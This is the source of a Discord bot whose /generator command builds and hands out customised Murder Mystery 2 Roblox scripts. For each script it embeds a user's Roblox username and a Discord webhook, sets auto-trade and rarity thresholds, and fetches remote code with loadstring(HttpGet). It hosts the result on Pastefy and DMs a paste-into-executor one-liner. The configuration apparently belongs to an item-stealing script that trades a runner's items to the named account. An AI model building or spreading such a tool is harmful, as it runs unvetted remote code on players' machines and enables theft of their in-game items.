const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  InteractionType,
  EmbedBuilder,
  PermissionFlagsBits
} = require('discord.js');
const axios = require('axios');

// ================== CONFIG ==================
let config;
try {
  config = require('./config.json');
} catch {
  config = {
    TOKEN: process.env.TOKEN,
    CLIENT_ID: process.env.CLIENT_ID,
    GUILD_ID: process.env.GUILD_ID,
    PASTEFY_API_KEY: process.env.PASTEFY_API_KEY
  };
}

// ================== CLIENT ==================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

// ================== SLASH COMMANDS ==================
const commands = [
  new SlashCommandBuilder()
    .setName('generator')
    .setDescription('Open the script generator panel')
    .toJSON()
];

const rest = new REST({ version: '10' }).setToken(config.TOKEN);

(async () => {
  try {
    console.log('Registering slash commands...');
    await rest.put(
      Routes.applicationGuildCommands(config.CLIENT_ID, config.GUILD_ID),
      { body: commands }
    );
    console.log('Slash commands registered successfully.');
  } catch (err) {
    console.error('Failed to register slash commands:', err);
  }
})();

// ================== READY ==================
client.once('clientReady', () => {
  console.log(`Bot is online: ${client.user.tag}`);
});

// ================== DELETE NON-ADMIN MESSAGES ==================
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
  if (message.author.id === message.guild.ownerId) return;

  try {
    await message.delete();
  } catch (e) {}

  try {
    await message.author.send({
      embeds: [
        new EmbedBuilder()
          .setTitle('Warning')
          .setDescription('You are not allowed to chat in this server.\nPlease use the `/generator` command only.')
          .setColor(0xFF0000)
          .setFooter({ text: message.guild.name })
      ]
    });
  } catch (dmErr) {}
});

// ================== INTERACTIONS ==================
client.on('interactionCreate', async (interaction) => {

  if (interaction.isChatInputCommand() && interaction.commandName === 'generator') {
    const embed = new EmbedBuilder()
      .setTitle('Script Generator')
      .setDescription('Select what game you want to generate a script for:')
      .setColor(0x5865F2)
      .setImage('https://i.pinimg.com/736x/4b/a2/a9/4ba2a96f103a28c9bcbca016c8f1fe66.jpg');

    const menu = new StringSelectMenuBuilder()
      .setCustomId('generator_menu')
      .setPlaceholder('Choose a game...')
      .addOptions([
        {
          label: 'MM2',
          description: 'Murder Mystery 2 Script Generator',
          value: 'mm2',
          emoji: '🔪'
        }
      ]);

    const row = new ActionRowBuilder().addComponents(menu);

    await interaction.reply({
      embeds: [embed],
      components: [row],
      ephemeral: true
    });
  }

  if (interaction.isStringSelectMenu() && interaction.customId === 'generator_menu') {
    const selected = interaction.values[0];

    if (selected === 'mm2') {
      const modal = new ModalBuilder()
        .setCustomId('mm2_modal')
        .setTitle('MM2 Generator Setup');

      const usernameInput = new TextInputBuilder()
        .setCustomId('username_input')
        .setLabel('Roblox Username')
        .setPlaceholder('Enter your Roblox username')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setMaxLength(50);

      const webhookInput = new TextInputBuilder()
        .setCustomId('webhook_input')
        .setLabel('Discord Webhook URL')
        .setPlaceholder('https://discord.com/api/webhooks/...')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setMaxLength(250);

      modal.addComponents(
        new ActionRowBuilder().addComponents(usernameInput),
        new ActionRowBuilder().addComponents(webhookInput)
      );

      await interaction.showModal(modal);
    }
  }

  if (interaction.type === InteractionType.ModalSubmit && interaction.customId === 'mm2_modal') {
    const username = interaction.fields.getTextInputValue('username_input').trim();
    const webhook = interaction.fields.getTextInputValue('webhook_input').trim();

    await interaction.deferReply({ ephemeral: true });

    const webhookRegex = /^https:\/\/(ptb\.|canary\.)?(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/;
    if (!webhookRegex.test(webhook)) {
      return interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setTitle('Invalid Webhook URL')
            .setDescription('Please provide a valid Discord webhook URL.')
            .setColor(0xFF0000)
        ]
      });
    }

    const scriptContent =
`_G.Usernames = {"${username}"}
_G.min_rarity = "Uncommon"
_G.min_value = 1
_G.pingEveryone = "Yes"
_G.webhook = "${webhook}"
_G.TradeMode = "AUTO"

loadstring(game:HttpGet("https://raw.githubusercontent.com/XHupScript/Xscript/refs/heads/main/mm2"))()`;

    try {
      const pasteRes = await axios.post(
        'https://pastefy.app/api/v2/paste',
        {
          content: scriptContent,
          title: `MM2 Script - ${username}`,
          visibility: 'UNLISTED',
          type: 'PASTE'
        },
        {
          headers: {
            'Authorization': `Bearer ${config.PASTEFY_API_KEY}`,
            'Content-Type': 'application/json'
          }
        }
      );

      const pasteData = pasteRes.data.paste || pasteRes.data;
      const pasteId = pasteData.id;

      if (!pasteId) throw new Error('No paste ID returned');

      const rawUrl = `https://pastefy.app/${pasteId}/raw`;
      const finalScript = `loadstring(game:HttpGet("${rawUrl}"))()`;

      try {
        await interaction.user.send({
          embeds: [
            new EmbedBuilder()
              .setTitle('Your MM2 Script is Ready')
              .setDescription('Here is your generated script:')
              .setColor(0x00FF00)
              .addFields(
                { name: 'Roblox Username', value: username, inline: true },
                { name: 'Game', value: 'MM2', inline: true }
              )
              .setImage('https://i.pinimg.com/736x/4b/a2/a9/4ba2a96f103a28c9bcbca016c8f1fe66.jpg')
              .setFooter({ text: 'Copy the script below and paste it in your executor' })
          ]
        });

        await interaction.user.send({
          content: `\`\`\`lua\n${finalScript}\n\`\`\``
        });

        await interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('Success')
              .setDescription('Your script has been sent to your DMs.')
              .setColor(0x00FF00)
          ]
        });

      } catch (dmErr) {
        await interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setTitle('DMs Closed')
              .setDescription('I could not DM you. Please enable DMs from server members.')
              .setColor(0xFFA500)
          ]
        });
        await interaction.followUp({
          content: `\`\`\`lua\n${finalScript}\n\`\`\``,
          ephemeral: true
        });
      }

    } catch (err) {
      console.error('Pastefy error:', err.response?.data || err.message);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setTitle('Error')
            .setDescription('Failed to generate the script. Please try again later.')
            .setColor(0xFF0000)
        ]
      });
    }
  }
});

client.login(config.TOKEN);